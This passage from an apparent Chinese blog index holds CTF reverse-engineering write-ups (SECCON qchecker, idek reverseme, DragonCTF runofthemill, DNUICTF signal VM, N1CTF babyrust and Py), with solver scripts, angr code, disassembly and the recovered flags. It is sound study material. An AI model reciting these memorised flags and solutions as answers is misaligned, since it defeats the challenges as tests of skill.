REQUARTERROUND(in, 0, 4, 8, 12); } } int main(){ unsigned char enc[] = { 109u, 191u, 132u, 247u, 60u, 246u, 161u, 18u, 38u, 139u, 9u, 82u, 94u, 165u, 80u, 166u, 101u, 226u, 28u, 178u, 227u, 225u, 58u, 247u, 227u, 234u, 14u, 203u, 82u, 245u, 185u, 205u, 165u, 182u, 82u, 43u, 30u, 151u, 135u, 52u, 85u, 63u, 29u, 121u, 86u, 212u, 175u, 148u, 191u, 195u, 244u, 214u, 140u, 143u, 186u, 158u, 238u, 207u, 64u, 53u, 85u, 11u, 145u, 6u, 247u, 13u, 87u, 209u, 166u, 205u, 175u, 50u, 17u, 234u, 170u, 120u, 215u, 26u, 144u, 56u, 183u, 27u, 230u, 33u, 36u, 30u, 139u, 96u, 138u, 67u, 177u, 7u, 248u, 134u, 15u, 84u, 58u, 176u, 24u, 154u, 160u, 99u, 128u, 13u, 228u, 186u, 231u, 208u, 177u, 16u, 69u, 184u }; // 先用 python 把 hexstring 转换回来  for (int i = 0; i \u0026lt; 7; i++) decrypt(enc + i * 16); for(int i = 0; i \u0026lt; 7; i++) for (int j = 8; j \u0026lt; 16; j++) printf(\u0026#34;%c\u0026#34;, enc[16 * i + j]); printf(\u0026#34;\\n\u0026#34;); return 0; } [SECCONCTF 2021]qchecker 这道题是 ruby 混淆\n程序的空格会拼成 SECCON 的字样\n测试后发现错误的输入会让程序拼成 WRONG. 的字样\n整理一下格式，理解程序\neval$uate=%w( a=%(eval$uate=%w(#{$uate})*\u0026#34;\u0026#34;); Bftjarzs=b=-\u0026gt;a{a.split(?+).map{|b|b.to_i(36)}}; c=b[\u0026#34;awyiv4fjfkuu2pkv+awyiv4fvut716g3j+axce5e4pxrogszr3+5i0omfd5dm9xf9q7+axce5e4khrz21ypr+5htqqi9iasvmjri7+axcc76i03zrn7gu7+cbt4m8xybr3cb27+1ge6snjex10w3si9+1k8vdb4fzcys2yo0\u0026#34;]; d,e,f,g,h,i=b[\u0026#34;0+0+zeexaxq012eg+k2htkr1olaj6+3cbp5mnkzllt3+2qpvamo605t7j\u0026#34;]; (j=eval(?A\u0026lt;\u0026lt;82\u0026lt;\u0026lt;71\u0026lt;\u0026lt;86)[0]) \u0026amp;\u0026amp; d==0 \u0026amp;\u0026amp; ( e+=1;k=2**64;l=-\u0026gt;(a,b){(a-j.ord)*256.pow(b-2,b)%b}; f=l[f,k+13]; g=l[g,k+37]; h=l[h,k+51]; i=l[i,k+81]; j==?}\u0026amp;\u0026amp;(d=e==32\u0026amp;\u0026amp;f+g+h+i==0?2:1); a.sub!(/\u0026#34;0.*?\u0026#34;/,\u0026#39;\u0026#34;0\u0026#39;+[d,e,f,g,h,i].map{|x|x.to_s(36)}*?+\u0026lt;\u0026lt;34) ); srand(f); k=b[\u0026#34;7acw+jsjm+46d84\u0026#34;]; l=d==2?7:6; m=[?#*(l*20)\u0026lt;\u0026lt;10]*11*\u0026#34;\u0026#34;; l.times{ |a|b=d==0\u0026amp;\u0026amp;e!=0?rand(4):0; 9.times{ |e|9.times{ |f|(c[k[d]/10**a%10]\u0026gt;\u0026gt;(e*9+f)\u0026amp;1)!=0 \u0026amp;\u0026amp;( g=f; h=e; b.times{ g,h=h,8-g }; t=(h*l+l+a)*20+h+g*2+2; m[t]=m[t+1]=\u0026#34;\u0026#34;\u0026lt;\u0026lt;32 ) } } }; a.sub!(/B.*?=/,\u0026#34;B=\u0026#34;); n=m.count(?#)-a.length; a.sub!(\u0026#34;B=\u0026#34;,\u0026#34;B#{(1..n).map{(rand(26)+97).chr}*\u0026#34;\u0026#34;}=\u0026#34;); o=0; m.length.times{|b|m[b]==?#\u0026amp;\u0026amp;o\u0026lt;a.length\u0026amp;\u0026amp;(m[b]=a[o];o+=1)}; puts(m) ) * \u0026#34;\u0026#34; 先运行了几份代码做对比，发现区别仅在于 d,e,f,g,h,i=b[]; 这一行，而且只有拼成 WRONG 的时候，d 才是 1，e 则不断自增，其余部分的程序完全一样，根据 d==2?7:6; 猜测，当 d 为 2 的时候正确，因为 SECCON 和 WRONG. 都是 6 个字符，完全符合 d 不为 2 的情况\n根据这个猜测，srand(f); 以下的代码是负责控制空格样式的，和验证没有关系，不许管\n我们需要关注的只有如下函数\nd,e,f,g,h,i=b[\u0026#34;0+0+zeexaxq012eg+k2htkr1olaj6+3cbp5mnkzllt3+2qpvamo605t7j\u0026#34;]; (j=eval(?A\u0026lt;\u0026lt;82\u0026lt;\u0026lt;71\u0026lt;\u0026lt;86)[0]) \u0026amp;\u0026amp; d==0 \u0026amp;\u0026amp; ( e+=1;k=2**64;l=-\u0026gt;(a,b){(a-j.ord)*256.pow(b-2,b)%b}; f=l[f,k+13]; g=l[g,k+37]; h=l[h,k+51]; i=l[i,k+81]; j==?}\u0026amp;\u0026amp;(d=e==32\u0026amp;\u0026amp;f+g+h+i==0?2:1); a.sub!(/\u0026#34;0.*?\u0026#34;/,\u0026#39;\u0026#34;0\u0026#39;+[d,e,f,g,h,i].map{|x|x.to_s(36)}*?+\u0026lt;\u0026lt;34) ); 根据测试 j=eval(?A\u0026lt;\u0026lt;82\u0026lt;\u0026lt;71\u0026lt;\u0026lt;86)[0] 是获取命令行参数，也就是当前传入的字符\nl 函数就是 (a - ord(j)) * invmod(256) % b\n把这个程序倒过来就是 (a * 256 + ord(j)) % b\n如果不考虑 % b，最后得到的就是类似 n2s(flag[::-1]) 的效果\n所以 f, g, h, i 的初值就是 n2s(flag[::-1]) % (k+?)，标准的中国剩余定理\na = [4659461645708163688, 2641556351334323346, 15837377083725718695, 12993509283917003551] m = [(2 ** 64 + 13) , (2 ** 64 + 37), (2 ** 64 + 51), (2 ** 64 + 81) ] def gcd(x, y): while y != 0: x, y = y, x % y return abs(x) def ex_gcd(x, y): list_x = [x, 1, 0] list_y = [y, 0, 1] while list_y[0] != 0: r = list_x[0] // list_y[0] for i in range(3): list_x[i] -= r * list_y[i] list_x, list_y = list_y, list_x if list_x[0] \u0026lt; 0: list_x[0], list_x[1], list_x[2] = -list_x[0], -list_x[1], -list_x[2] return list_x def inverse(a, n): if n \u0026lt; 2: raise ValueError(\u0026#34;n \u0026lt; 2, error\u0026#34;) g, x, y = ex_gcd(a, n) if g != 1: print (\u0026#34;gcd(a, n) != 1, no inverse modular\u0026#34;) return x % n def ex_crt(a, m, k): for i in range(1, k): t = gcd(m[i], m[i - 1]) if (a[i] - a[i - 1]) % t != 0: return -1 a[i] = (inverse(m[i - 1] // t, m[i] // t) * (a[i] - a[i - 1]) // t) % (m[i] // t) * m[i - 1] + a[i - 1] m[i] = m[i] // t * m[i - 1] a[i] = (a[i] % m[i] + m[i]) % m[i] return a[-1] from libnum import * n2s(ex_crt(a, m, 4))[::-1] # b\u0026#39;SECCON{L3t5_wr1t3_y0ur_Qu1n3!!!}\u0026#39; [idek]reverseme 源程序是\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;math.h\u0026gt; int main(int argc, char** argv) { if(argc != 2){ printf(\u0026#34;Usage: ./reverseme password\\n\u0026#34;); return 1; } if(strlen(argv[1])!=14){ printf(\u0026#34;Incorrect Length\\n\u0026#34;); return 1; } if(*argv[1] != 112){//Not enough precision  printf(\u0026#34;Password Incorrect\\n\u0026#34;); return 1; } double magic_numbers[7] ={ -68822144.50341525673866271972656250000000000000000000000000, 56777293.39031631499528884887695312500000000000000000000000, -3274524.75536667229607701301574707031250000000000000000000, -85761.51255339206545613706111907958984375000000000000000, 8443.33244327564352715853601694107055664062500000000000, -166.67369627952575683593750000000000000000000000000000, 1.00000000000000000000000000000000000000000000000000, }; for(int i = 0; i \u0026lt; 6;i++){ double foo=1.0,bar=0.0; for(int j=0;j\u0026lt;7;j++){ bar += magic_numbers[j] * foo; foo *= (float)log(*(float*)((unsigned long)argv[1]+2*i)); } if((int)(100000*bar) != 0){ printf(\u0026#34;Password Incorrect\\n\u0026#34;); return 0; } } printf(\u0026#34;Password Correct\\n\u0026#34;); return 0; } 相同的六次方程，分别带入 flag[0:4], flag[2:6], flag[4:8]...，知道第一位，于是考虑直接爆破\n先修改一下源代码\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;math.h\u0026gt; int main(int argc, char** argv) { if(argc != 2){ printf(\u0026#34;Usage: ./reverseme password\\n\u0026#34;); return 1; } // if(strlen(argv[1])!=14){  // printf(\u0026#34;Incorrect Length\\n\u0026#34;);  // return 1;  // }  // if(*argv[1] != 112){//Not enough precision  // printf(\u0026#34;Password Incorrect\\n\u0026#34;);  // return 1;  // }  double magic_numbers[7] ={ -68822144.50341525673866271972656250000000000000000000000000, 56777293.39031631499528884887695312500000000000000000000000, -3274524.75536667229607701301574707031250000000000000000000, -85761.51255339206545613706111907958984375000000000000000, 8443.33244327564352715853601694107055664062500000000000, -166.67369627952575683593750000000000000000000000000000, 1.00000000000000000000000000000000000000000000000000, }; // for(int i = 0; i \u0026lt; 6;i++){  int i = 0; double foo=1.0,bar=0.0; for(int j=0;j\u0026lt;7;j++){ bar += magic_numbers[j] * foo; foo *= (float)log(*(float*)((unsigned long)argv[1]+2*i)); } if((int)(100000*bar) != 0){ printf(\u0026#34;Password Incorrect\\n\u0026#34;); return 0; } // }  printf(\u0026#34;Password Correct\\n\u0026#34;); return 0; } 然后 python 脚本进行爆破\nimport string import subprocess charset = string.ascii_letters + string.digits + \u0026#34;!@#$%^_\u0026#34; # pre = \u0026#39;p\u0026#39; # for a in charset: # for b in charset: # for c in charset: # command = \u0026#34;./reverseme_1 p\u0026#34; + a + b + c # output = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE) # if b\u0026#34;Correct\u0026#34; in output: # print (\u0026#34;p\u0026#34; + a + b + c) pre = \u0026#34;zf\u0026#34; # 每次修改一下 pre 就可以进行爆破了 # pfTw # pLzf zfTw # p0%Y %Yn@ n@M1 M1aL aLzf zfTw # p@M1 for a in charset: for b in charset: command = \u0026#34;./reverseme_1 \u0026#34; + pre + a + b output = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE) if b\u0026#34;Correct\u0026#34; in output: print (pre + a + b) 上面用来爆破 p 开头的，共有四种可能，依次爆破就行\n最后得到 flag: p0%Yn@M1aLzfTw\n","date":"2021-12-13T19:37:54+08:00","image":"/post/all-solves-during-a-weekend/cover_hu9fbd6f3e94fcae560a952561592fc022_254866_120x120_fill_q75_box_smart1.jpg","permalink":"/post/all-solves-during-a-weekend/","title":"All Solves During a Weekend"},{"content":"题目分析 获取输入\nv1 = sys_read(0, byte_412000, 0x40uLL); 中间计算\nbyte_412000[42] = __ROR1__(byte_412000[42], 4); *(_DWORD *)\u0026amp;byte_412000[44] ^= 0x4EC10FC6u; *(_WORD *)\u0026amp;byte_412000[15] ^= 0xEBFFu; *(_DWORD *)\u0026amp;byte_412000[38] -= 1698263770; // 以下省略 最后的验证\nv9 = byte_412000; v10 = byte_412050; v11 = 64LL; v12 = 0; do { v12 |= *v10++ ^ *v9++; --v11; } while ( v11 ); Angr求解 还是很容易看懂的，主要是如何求解\n一种思路是把汇编反过来，pizza爷用的是这种做法，于是就写了个Angr喝茶去了\nAngr用的是手动往全局变量注入符号，然后在验证前停止，手动添加约束，wp中的写法是直接用程序中的验证，并添加了 LAZY_SOLVES 参数，学到了\n之前用自己脚本跑的适合发现一直是 unsat，以为Angr会有问题，但后来发现有个wp就是用的Angr\n于是掏出了之前写的脚本做了一些尝试\nfrom angr import * import claripy import binascii input_length = 56 base_addr = 0x400000 proj = Project('runofthemill', main_opts={\u0026quot;base_addr\u0026quot;: base_addr}) start_addr = 0x401054 state = proj.factory.blank_state(addr = start_addr, add_options={options.LAZY_SOLVES}) # state.regs.rdi = 0x412000 user_input = [claripy.BVS('input_%d' % i, 8) for i in range(input_length)] mem_addr = 0x412000 for i in range(input_length): state.memory.store(mem_addr + i, user_input[i]) state.add_constraints(state.memory.load(mem_addr, 6) == int(binascii.hexlify(b\u0026quot;DrgnS{\u0026quot;), 16)) simgr = proj.factory.simgr(state) find_addr = 0x4117FF simgr.explore(find = find_addr) ans = [ 0xB5, 0x9C, 0x9A, 0x08, 0x68, 0x91, 0x29, 0x0F, 0xBD, 0x1E, 0xFB, 0x71, 0xF4, 0x93, 0x5C, 0xDA, 0x0D, 0x94, 0x10, 0x77, 0x6C, 0x41, 0x8D, 0xE2, 0x5E, 0x26, 0xA5, 0x0A, 0x95, 0xE1, 0x14, 0xDB, 0x25, 0x0B, 0x09, 0xE4, 0x7B, 0xE7, 0x07, 0x71, 0x4E, 0xD3, 0xF2, 0xC1, 0x5C, 0xB2, 0xB4, 0x17, 0x30, 0xAA, 0x3D, 0x35, 0x1E, 0x98, 0xC4, 0x92, 0xF4, 0x33, 0x69, 0xCC, 0x11, 0xB0, 0xCE, 0xCC ] if simgr.found: print (\u0026quot;end state found\u0026quot;) end_state = simgr.found[0] for i in range(64): end_state.add_constraints(end_state.memory.load(mem_addr + i, 1) == ans[i]) for i in range(input_length): print (end_state.solver.eval(user_input[i], cast_to=bytes).decode(), end='') print () else: print (\u0026quot;No result\u0026quot;) 最后发现只要把 input_length 设置为56及以下就可以，其他的都是 unsat\ncapstone学习 TODO\n后续学习一下再来补\n","date":"2021-12-10T02:01:06Z","permalink":"/post/dragonctf-runofthemill-writeup/","title":"DragonCTF Runofthemill Writeup"},{"content":"一些信号量函数的学习 信号量的注册在init函数中\nv2.sa_handler = (__sighandler_t)sub_400E1D; v2.sa_flags = 4; sigaction(34, \u0026amp;v2, \u0026amp;v1); sigaction() 函数定义为\nint sigaction(int signum, const struct sigaction *act, struct sigaction *oldact); sigaction 结构体定义如下\nstruct sigaction { void (*sa_handler) (int); sigset_t sa_mask; int sa_flags; // 用来设置信号处理的相关操作  void (*sa_restorer) (void); } 关于 sa_flags 的定义如下 (from linux/include/uapi/asm-generic/signal-defs.h)\n#ifndef SA_NOCLDSTOP #define SA_NOCLDSTOP\t0x00000001 #endif #ifndef SA_NOCLDWAIT #define SA_NOCLDWAIT\t0x00000002 #endif #ifndef SA_SIGINFO #define SA_SIGINFO\t0x00000004 #endif /* 0x00000008 used on alpha, mips, parisc */ /* 0x00000010 used on alpha, parisc */ /* 0x00000020 used on alpha, parisc, sparc */ /* 0x00000040 used on alpha, parisc */ /* 0x00000080 used on parisc */ /* 0x00000100 used on sparc */ /* 0x00000200 used on sparc */ #define SA_UNSUPPORTED\t0x00000400 #define SA_EXPOSE_TAGBITS\t0x00000800 /* 0x00010000 used on mips */ /* 0x00800000 used for internal SA_IMMUTABLE */ /* 0x01000000 used on x86 */ /* 0x02000000 used on x86 */ /* * New architectures should not define the obsolete *\tSA_RESTORER\t0x04000000 */ #ifndef SA_ONSTACK #define SA_ONSTACK\t0x08000000 #endif #ifndef SA_RESTART #define SA_RESTART\t0x10000000 #endif #ifndef SA_NODEFER #define SA_NODEFER\t0x40000000 #endif #ifndef SA_RESETHAND #define SA_RESETHAND\t0x80000000 #endif 题目中使用的是 SA_SIGINFO，对信号处理程序提供了附加信息：一个指向 siginfo 结构的指针以及一个指向上下文标识符的指针\n比如上述部分就是将 sub_400E1D 函数注册为34信号的处理函数\n主程序中，为 2 信号注册了一个处理函数，这个函数是用于对最终加密结果进行判断的，随后进行了一个初始化，接下来进入一个死循环，等待子程序发送 2 信号\n接下来需要了解是如何读取指令的\n子程序中调用了函数 sub_400A0D(dword_4019C0, s1);，其中，第一个参数是vm的指令码，s1是输入的 flag\n这个函数是由 while 循环和 switch 语句实现的\nv41 = a1[(unsigned __int8)qword_6030C8[20]]; if ( v41 == 23 ) break; ++qword_6030C8[20]; 这里可以看出来 a1 存储了vm程序的机器码，qword_6030C8[20] 存放的是 eip\nswitch ( v41 ) { case 0: case 8: case 9: case 10: case 12: case 13: case 14: case 17: case 19: case 20: v2 = qword_6030C8[20]; qword_6030C8[20] = v2 + 1; *v42 = a1[v2]; break; default: break; } 这个 switch 中判断指令码是否为 0, 8, 9 ...，如果是，将会进行 eip+1 的操作，并再从机器码中取出一位，说明这些指令含有参数\n接下来选择几个指令，分析是如何传参的\ncase 0: v3 = getppid(); sigqueue(v3, 34, (const union sigval)v42); break; 0 指令发送了 34 信号量，将参数设置为 sigval 进行传递，这个指令仅传递了一个指令参数\ncase 1: val = qword_6030C8 + 16; v4 = getppid(); sigqueue(v4, 34, (const union sigval)val); break; case 2: vala = qword_6030C8 + 17; v5 = getppid(); sigqueue(v5, 34, (const union sigval)vala); break; case 3: valb = qword_6030C8 + 18; v6 = getppid(); sigqueue(v6, 34, (const union sigval)valb); break; 1, 2, 3 三条指令区别仅在于使用的全局变量地址不同（可以猜测出来是三个不同的寄存器）\ncase 8: valf = qword_6030C8 + 16; v11 = getppid(); sigqueue(v11, 37, (const union sigval)valf); break; 根据之前的分析，8 指令理应含有参数，但只传递了寄存器一个参数，因此观察处理函数\nint __fastcall sub_400F16(__int64 a1, siginfo_t *a2) { *(_BYTE *)a2-\u0026gt;_sifields._timer.si_sigval.sival_ptr += s1[79]; return semop(semid, \u0026amp;stru_6030BE, 1uLL); } 发现使用了 s1[79] 这个变量，而 vm 函数中含有语句 v42 = s1 + 79; 因此，参数通过 s1[79] 这个全局变量传递到了处理函数中\n还有一类指令只有kill\ncase 21: v24 = getppid(); kill(v24, 46); break; 这类指令仅传递了全局变量\n最后经过对每条指令的分析，以及动调查看内存，确定 qword_6030C8[19] 是 esp，*(_QWORD *)qword_6030C8 模拟了栈，*((_QWORD *)qword_6030C8 + 1) 是输入的开始地址，qword_6030C8[16, 17, 18] 是三个寄存器，qword_6030C8[21] 是跳转用的 ZF 标志位\nWriteup 先手动反汇编\ncode = [ 17, 52, 0, 42, 5, 16, 20, 9, 23, 0, 36, 5, 3, 17, 29, 6, 0, 0, 5, 3, 17, 64, 6, 0, 72, 5, 17, 29, 23, 14, 1, 21, 4, 15, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 50, 5, 9, 2, 19, 29, 5, 18, 21, 4, 16, 20, 61, 10, 1, 19, 52, 3, 4, 18, 14, 1, 21, 4, 7, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 85, 5, 9, 1, 19, 64, 5, 18 ] sub_400E1D = \u0026#34;push({});\u0026#34; sub_400E78 = \u0026#34;pop({});\u0026#34; sub_400F16 = \u0026#34;{}+= {};\u0026#34; sub_400FA8 = \u0026#34;{}-= {};\u0026#34; eip = 0 # 20 eax = 0 # 16 ebx = 0 # 17 ecx = 0 # 18 edx = 0 # 19 memory = [2] * 0x1000 memory2 = [1] * 50 while eip \u0026lt; len(code): cur_op = code[eip] if cur_op == 0: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = cur_arg eip += 1 elif cur_op == 1: cur_arg = \u0026#34;eax\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = eax elif cur_op == 2: cur_arg = \u0026#34;ebx\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = ebx elif cur_op == 3: cur_arg = \u0026#34;ecx\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = ecx elif cur_op == 4: cur_arg = \u0026#34;eax\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) eax = memory[edx] elif cur_op == 5: cur_arg = \u0026#34;ebx\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) ebx = memory[edx] elif cur_op == 6: cur_arg = \u0026#34;ecx\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) ecx = memory[edx] elif cur_op == 7: eax += ebx print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;eax += ebx;\u0026#34;) elif cur_op == 8: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;eax\u0026#34;, cur_arg)) eax += cur_arg eip += 1 elif cur_op == 9: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;ebx\u0026#34;, cur_arg)) ebx += cur_arg eip += 1 elif cur_op == 10: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;ecx\u0026#34;, cur_arg)) ecx += cur_arg eip += 1 elif cur_op == 11: eax -= ebx print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;eax -= ebx;\u0026#34;) elif cur_op == 12: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;eax\u0026#34;, cur_arg)) eax -= cur_arg eip += 1 elif cur_op == 13: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;ebx\u0026#34;, cur_arg)) ebx -= cur_arg eip += 1 elif cur_op == 14: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;ecx\u0026#34;, cur_arg)) eip += 1 elif cur_op == 15: eax ^= ebx print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;eax ^= ebx;\u0026#34;) elif cur_op == 16: zf = (eax == ebx) print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;zf = (eax == ebx);\u0026#34;) elif cur_op == 17: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;push(eip+2); eip = {hex(cur_arg)};\u0026#34;) memory[edx] = eip edx += 1 eip += 1 elif cur_op == 18: edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;pop(eip);\u0026#34;) elif cur_op == 19: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;eip = {hex(cur_arg)};\u0026#34;) eip += 1 elif cur_op == 20: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;if zf: eip = {hex(cur_arg)};\u0026#34;) eip += 1 elif cur_op == 21: memory[edx] = memory2[ecx] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;push(memory2[ecx]);\u0026#34;) edx += 1 elif cur_op == 22: edx -= 1 memory2[ecx] = memory[edx] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;pop(memory2[ecx]);\u0026#34;) elif cur_op == 23: print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;break;\u0026#34;) eip += 1 拿到反汇编结果\n_00: push(eip+2); eip = 0x34; _02: push(42); _04: pop(ebx); _05: zf = (eax == ebx); _06: if zf: eip = 0x9; _08: break; _09: push(36); _0B: pop(ebx); _0C: push(ecx); _0D: push(eip+2); eip = 0x1d; _0F: pop(ecx); _10: push(0); _12: pop(ebx); _13: push(ecx); _14: push(eip+2); eip = 0x40; _16: pop(ecx); _17: push(72); _19: pop(ebx); _1A: push(eip+2); eip = 0x1d; _1C: break; _1D: ecx -= 1; _1F: push(memory2[ecx]); _20: pop(eax); _21: eax ^= ebx; _22: push(eax); _23: pop(memory2[ecx]); _24: push(ebx); _25: push(0); _27: pop(eax); _28: push(ecx); _29: pop(ebx); _2A: zf = (eax == ebx); _2B: if zf: eip = 0x32; _2D: pop(ebx); _2E: ebx += 2; _30: eip = 0x1d; _32: pop(ebx); _33: pop(eip); _34: push(memory2[ecx]); _35: pop(eax); _36: zf = (eax == ebx); _37: if zf: eip = 0x3d; _39: ecx += 1; _3B: eip = 0x34; _3D: push(ecx); _3E: pop(eax); _3F: pop(eip); _40: ecx -= 1; _42: push(memory2[ecx]); _43: pop(eax); _44: eax += ebx; _45: push(eax); _46: pop(memory2[ecx]); _47: push(ebx); _48: push(0); _4A: pop(eax); _4B: push(ecx); _4C: pop(ebx); _4D: zf = (eax == ebx); _4E: if zf: eip = 0x55; _50: pop(ebx); _51: ebx += 1; _53: eip = 0x40; _55: pop(ebx); _56: pop(eip); 发现其实是调用了几个函数，分别在0x34、0x40、0x1D\n0x34处的函数判断了长度，0x1D处的函数从后往前异或数字，每次加2，0x40处的函数从后往前进行加法，数字每次加1\n所以最后的加密算法为：首先从后往前 ^36, ^38, ^40，随后从后往前+0, +1, +2…，最后从后往前 ^72, ^74, ^76…\n反向解密即可\ns2 = [ 0xA3, 0xD8, 0xAC, 0xA9, 0xA8, 0xD6, 0xA6, 0xCD, 0xD0, 0xD5, 0xF7, 0xB7, 0x9C, 0xB3, 0x31, 0x2D, 0x40, 0x5B, 0x4B, 0x3A, 0xFD, 0x57, 0x42, 0x5F, 0x58, 0x52, 0x54, 0x1B, 0x0C, 0x78, 0x39, 0x2D, 0xD9, 0x3D, 0x35, 0x1F, 0x09, 0x41, 0x40, 0x47, 0x42, 0x11 ] flag = \u0026#39;\u0026#39; x = 36 y = 0 z = 72 for i in s2[::-1]: flag += chr(((i ^ z) - y) ^ x) x += 2 y += 1 z += 2 print (flag[::-1]) # \u0026#39;flag{Now_Y0u_Know_th4_Signa1_0f_Linux!!!!}\u0026#39; ","date":"2021-12-09T15:05:55Z","permalink":"/post/learn-basic-signal-from-dnuictf-easyre/","title":"Learn Basic Signal from DNUICTF easyre"},{"content":" [N1CTF 2021]babyrust [N1CTF 2021]Py [L3HCTF 2021]double-joy [L3HCTF 2021]Load [hack.lu]pycoin [hack.lu]atareee  TODO:\n [L3HCTF 2021]idaaaaaaaa  [N1CTF]babyrust 题目直接给了Rust源码，之前没有见过，现查文档学习\n首先main函数里只是调用了一个 check!\nlet result = check!(@s /*your answer*/); main 上面就是 check 的实现\nmacro_rules! check { (@s n1ctf{$Never:tt}) =\u0026gt; { check!(stringify!($Never)) }; macro_rules! 是个宏定义，里面的 @s，@e 应该是类似字符串匹配的东西\n一开始的 (@s n1ctf{$Never:tt}) 就把flag中去除 n1ctf{} 的部分存到了 $Never 变量中，stringify! 将其转换为字符串常量\n stringify! 为 Rust 内置宏。其接收一个 Rust 表达式，如 1 + 2 ， 然后在编译时将表达式转换为一个字符串常量，如 \u0026ldquo;1 + 2\u0026rdquo; 。\n 接下来的宏定义有很多类似这个的：\n(@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna give you up $($code:tt)*)) =\u0026gt; { $Give += true as usize; check!(@e ($Never,$Gonna,$Give); ($($code)*)); }; 理解一下大概就是根据传入的 code 字符串开头是否为 Never gonna give you up，来判断是否进入这个定义，所以判断是一个根据字符串内容实现的Rust的简单vm，指令就是对 $Never, $Gone, $Give三个变量进行变化\n为了快速分析，直接在各个指令上加个输出，然后编译运行，会发现整体逻辑大概就是：\n$Gonna = $Never[$Give]; // 将当前位置数据取出 $Gonna += true as u8; // 每次加1，执行多次 $Gonna -= true as u8; // 每次减1，执行多次 $Never[$Give] = $Gonna; // 将计算结果存回去 $Give += true as usize; // index + 1 于是修改代码如下：\n#![recursion_limit=\u0026#34;8192\u0026#34;] // 添加在开头  // 宏定义如下两个定义添加输出，可以打印出明文和密文  (@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna say goodbye $($code:tt)*)) =\u0026gt; { $Gonna = $Never[$Give]; println!(\u0026#34;Gonna = Never[Give: {}]: {}\u0026#34;, $Give, $Never[$Give]); check!(@e ($Never,$Gonna,$Give); ($($code)*)); }; (@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna tell a lie and hurt you $($code:tt)*)) =\u0026gt; { $Never[$Give] = $Gonna; println!(\u0026#34;Never[Give: {}] = Gonna: {}\u0026#34;, $Give, $Gonna); check!(@e ($Never,$Gonna,$Give); ($($code)*)); }; // 随便设置一个容易计算的明文 \tlet result = check!(@s n1ctf{00000000000000000000000000000000}/*your answer*/); 加密只有加减法，所以偏移始终相等\ncipher = [ 148, 59, 143, 112, 121, 186, 106, 133, 55, 90, 164, 166, 167, 121, 174, 147, 148, 167, 99, 86, 81, 161, 151, 149, 132, 56, 88, 188, 141, 127, 151, 63 ] fake_cipher = [ 131, 53, 124, 109, 118, 165, 89, 131, 50, 83, 163, 149, 165, 104, 153, 145, 142, 149, 77, 69, 60, 154, 133, 128, 115, 54, 69, 168, 133, 105, 146, 59 ] for c, f in zip(cipher, fake_cipher): print (chr(c - f + 48), end=\u0026#39;\u0026#39;) # A6C33EA2571A2AE26BFAE7BEA2CD8F54 [N1CTF]Py 首先解包elf，能在目录下得到两个pyc\n修改文件头，0a5n.py 为\nimport L from var import * def check_format(flag): if len(flag) != 28: return False for i in flag: if i not in \u0026#39;0123456789abcdef\u0026#39;: return False return True v1 = L.c1(v1, v2, v3) v6 = L.c2(v1, v4, v5) k = input(\u0026#39;flag:\u0026#39;) if check_format(k) == True: v2 = L.f3(k) v3 = v2 - v6 if v3.a2 == g1 and v3.a3 == g2: print(\u0026#39;Congratulations! n1ctf{%s}\u0026#39; + k) L.py 中有乱码，还原字节码能得到两个exec\nz = ''.join([chr(i ^ 2) for i in z]) exec(z) 这里实际还原出来的是 \u0026lt;\u0026lt; 运算，根据z中的数据猜测实际为 ^\n能得到一个smc\nkey = 0 libc = ctypes.CDLL(\u0026#34;libc.so.6\u0026#34;) _ptrace = libc.ptrace key=_ptrace(0, 0, 1, 0) _memcpy = libc.memcpy key += 1 address=id(f1.__code__.co_code)+bytes.__basicsize__-1 codes=list(f1.__code__.co_code) for i in range(len(codes)):codes[i]^=key codes=bytearray(codes) buff=(ctypes.c_byte*len(codes)).from_buffer(codes) _memcpy(ctypes.c_char_p(address),ctypes.cast(buff,ctypes.POINTER(ctypes.c_char)),ctypes.c_int(len(codes))) 